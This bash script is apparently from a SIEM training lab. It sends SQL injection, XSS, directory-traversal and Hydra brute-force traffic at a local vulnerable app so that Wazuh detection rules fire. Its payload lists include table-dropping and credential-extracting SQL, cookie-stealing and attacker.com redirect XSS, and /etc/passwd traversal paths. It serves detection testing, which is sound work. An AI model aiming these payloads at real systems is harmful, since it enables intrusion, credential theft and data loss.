#!/bin/bash
# =============================================================
# VulnBank SIEM Lab — Attack Simulator
# Generates realistic attack traffic for Wazuh to detect
# =============================================================
# Usage: sudo ./scripts/attack-simulator.sh [scenario]
# Scenarios: sql-injection | brute-force | xss | traversal | all
# =============================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

TARGET="http://localhost:5000"
LOGIN_URL="${TARGET}/login"

header() { echo -e "\n${CYAN}${BOLD}── $1 ──${NC}"; }
ok()     { echo -e "${GREEN}  ✓ $1${NC}"; }
info()   { echo -e "  → $1"; }
warn()   { echo -e "${YELLOW}  ⚠ $1${NC}"; }

check_deps() {
  for cmd in curl hydra; do
    if ! command -v "$cmd" &>/dev/null; then
      warn "$cmd not found. Install: sudo apt install -y $cmd"
    fi
  done
}

check_target() {
  if ! curl -s -o /dev/null -w "%{http_code}" "$TARGET" | grep -q "200\|302"; then
    echo -e "${RED}✗ VulnBank not reachable at $TARGET${NC}"
    echo "  Start it with: cd /opt/vuln-bank && docker-compose up -d"
    exit 1
  fi
  ok "VulnBank is running"
}

# --- SQL Injection ---
attack_sql_injection() {
  header "SQL Injection Attack"
  info "Sending SQL injection payloads to $LOGIN_URL"

  PAYLOADS=(
    "' OR '1'='1"
    "' OR '1'='1'--"
    "' OR 1=1--"
    "1; DROP TABLE users--"
    "' UNION SELECT null,username,password FROM users--"
    "admin'--"
    "1' AND SLEEP(5)--"
  )

  for payload in "${PAYLOADS[@]}"; do
    info "Payload: $payload"
    curl -s -X POST "$LOGIN_URL" \
      -d "username=${payload}&password=test" \
      -o /dev/null \
      -w "  HTTP %{http_code}\n"
    sleep 0.5
  done

  ok "SQL injection payloads sent — check Wazuh Discover for rule 100001 alerts"
}

# --- Brute Force ---
attack_brute_force() {
  header "Brute Force Attack"

  if command -v hydra &>/dev/null; then
    info "Using Hydra to brute-force VulnBank login"
    # Create a small wordlist
    echo -e "password\n123456\nadmin\nletmein\nqwerty\npassword1\nabc123\nwelcome\nmonkey\ndragon" \
      > /tmp/bf-wordlist.txt

    hydra -l admin -P /tmp/bf-wordlist.txt "$TARGET" \
      http-post-form "/login:username=^USER^&password=^PASS^:Invalid" \
      -t 4 -q 2>&1 | grep -v "^\[" || true
  else
    info "Hydra not available — using curl loop (10 rapid failed logins)"
    for i in $(seq 1 12); do
      curl -s -X POST "$LOGIN_URL" \
        -d "username=admin&password=wrongpassword${i}" \
        -o /dev/null
      echo "  Attempt $i sent"
      sleep 0.3
    done
  fi

  ok "Brute force complete — check Wazuh for rule 100003 alert (threshold: 10 in 2 min)"
}

# --- XSS ---
attack_xss() {
  header "Cross-Site Scripting (XSS) Attack"
  info "Sending XSS payloads to $LOGIN_URL"

  XSS_PAYLOADS=(
    '<script>alert(1)</script>'
    '<img src=x onerror=alert(document.cookie)>'
    'javascript:alert(1)'
    '<svg onload=alert(1)>'
    '"><script>document.location="http://attacker.com"</script>'
  )

  for payload in "${XSS_PAYLOADS[@]}"; do
    info "Payload: $payload"
    curl -s -X POST "$LOGIN_URL" \
      -d "username=${payload}&password=test" \
      -o /dev/null \
      -w "  HTTP %{http_code}\n"
    sleep 0.5
  done

  ok "XSS payloads sent — check Wazuh for rule 100002 alerts"
}

# --- Directory Traversal ---
attack_traversal() {
  header "Directory Traversal Attack"
  info "Sending path traversal payloads"

  PATHS=(
    "../../../etc/passwd"
    "..%2F..%2F..%2Fetc%2Fpasswd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "....//....//etc/passwd"
  )

  for path in "${PATHS[@]}"; do
    info "Path: $path"
    curl -s "${TARGET}/${path}" \
      -o /dev/null \
      -w "  HTTP %{http_code}\n"
    sleep 0.5
  done

  ok "Traversal payloads sent — check Wazuh for rule 100005 alerts"
}

# --- Help ---
usage() {
  echo -e "\n${BOLD}Usage:${NC} sudo $0 [scenario]"
  echo
  echo "  sql-injection   SQL injection payloads"
  echo "  brute-force     Password brute force (uses Hydra if available)"
  echo "  xss             Cross-site scripting payloads"
  echo "  traversal       Directory traversal paths"
  echo "  all             Run all scenarios in sequence"
  echo
}

# --- Main ---
check_deps
check_target

case "${1:-all}" in
  sql-injection) attack_sql_injection ;;
  brute-force)   attack_brute_force   ;;
  xss)           attack_xss           ;;
  traversal)     attack_traversal     ;;
  all)
    attack_sql_injection
    sleep 2
    attack_xss
    sleep 2
    attack_traversal
    sleep 2
    attack_brute_force
    echo -e "\n${GREEN}${BOLD}All scenarios complete. Open Wazuh Dashboard → Security Events.${NC}\n"
    ;;
  *) usage; exit 1 ;;
esac
